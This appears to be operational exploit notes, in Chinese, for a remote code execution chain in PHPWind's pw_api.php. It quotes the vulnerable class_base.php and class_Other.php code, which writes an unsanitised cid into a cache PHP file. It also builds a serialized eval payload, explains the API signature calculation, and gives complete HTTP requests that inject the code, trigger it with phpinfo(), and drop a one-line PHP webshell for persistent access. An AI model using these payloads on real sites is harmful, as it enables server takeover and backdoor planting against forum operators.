api/class_base.php L70-123（调用链）：
  function run($request) {
      $request = $this->strips($request);          // stripslashes，不做 Char_cv
      if (isset($request['type']) && $request['type']=='uc') { $this->apikey = $GLOBALS['uc_key']; }
      else { $this->type='app'; $this->apikey = $GLOBALS['db_siteownerid']; }
      ksort($request); reset($request); $arg='';
      foreach ($request as $key=>$value) { if ($value && $key!='sig') { $arg .= "$key=$value&"; } }
      if (empty($this->apikey) || md5($arg . $this->apikey) != $request['sig'])
          return new ErrorMsg(API_SIGN_ERROR,'Error Sign');
      $mode = $request['mode']; $method = $request['method'];
      $params = isset($request['params']) ? unserialize($request['params']) : array();
      return $this->callback($mode,$method,$params);
  }
  function callback($mode,$method,$params) {
      if (!file_exists(R_P.'api/class_' . $mode . '.php')) return new ErrorMsg(API_MODE_NOT_EXISTS,"Class($mode) Not Exists");
      require_once Pcv(R_P.'api/class_' . $mode . '.php');     // ← 链三：$mode 未过滤
      if (!method_exists($this->classdb[$mode],$method)) return new ErrorMsg(API_METHOD_NOT_EXISTS,...);
      return @call_user_func_array(array(&$this->classdb[$mode], $method), $params);
  }

api/class_Other.php 未修形态（maddogfyg 版本无此文件；下列为 wooyun 原文形态）：
  function threadscateGory($classdb) {
      $classcache = "<?php\r\n\$info_class=array(\r\n";
      foreach ($classdb as $key => $class) {
          !$class['ifshow'] && $class['ifshow'] = '0';
          $classcache .= "'$class[cid]'=>".pw_var_export($class).",\r\n\r\n";   // ← '$class[cid]' 双引号插值
      }
      $classcache .= ");\r\n?>";
      writeover(D_P."data/bbscache/info_class.php",$classcache);
  }

已修形态对照（全部已修）：
  pw75sp3 / pw75sp3_utf8/api/class_Other.php L168   $class['cid'] = intval($class['cid']);
  old-blueday-phpwind(8.7) / intBoys-PHPWind-8 / yuwenlan-phpwind  L166   $class['cid'] = (int)$class['cid'];

params 序列化结构（$class['cid'] 为字符串 => 生成行变成 '' . eval(...) . 'abc' => eval 执行）：
  a:1:{s:3:"cid";a:1:{s:3:"cid";s:21:"'.eval($_GET[c]).'abc";}}

sig 计算：ARG = "method=threadscateGory&mode=Other&params=<PARAMS>&type=app&"
          SIG = md5(ARG . apikey)

完整请求原文：
GET /bbs/pw_api.php?mode=Other&method=threadscateGory&type=app&params=a%3A1%3A%7Bs%3A3%3A%22cid%22%3Ba%3A1%3A%7Bs%3A3%3A%22cid%22%3Bs%3A21%3A%22%27.eval%28%24_GET%5Bc%5D%29.%27abc%22%3B%7D%7D&sig=<MD5> HTTP/1.1
Host: <target>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/203.0.113.17 Safari/537.36

然后触发执行：
GET /bbs/data/bbscache/info_class.php?c=phpinfo(); HTTP/1.1
Host: <target>

落冰蝎/哥斯拉马（目标 file_put_contents 未被禁用）：
GET /bbs/data/bbscache/info_class.php?c=file_put_contents('x.php','<?php @eval($_POST[1]);?>'); HTTP/1.1
（open_basedir = 各站文档根 + /tmp，落点必须在文档根内）

落盘脚本：runs/pw-rce-exp/03-pwapi-chain.sh <APIKEY> [BASE_URL]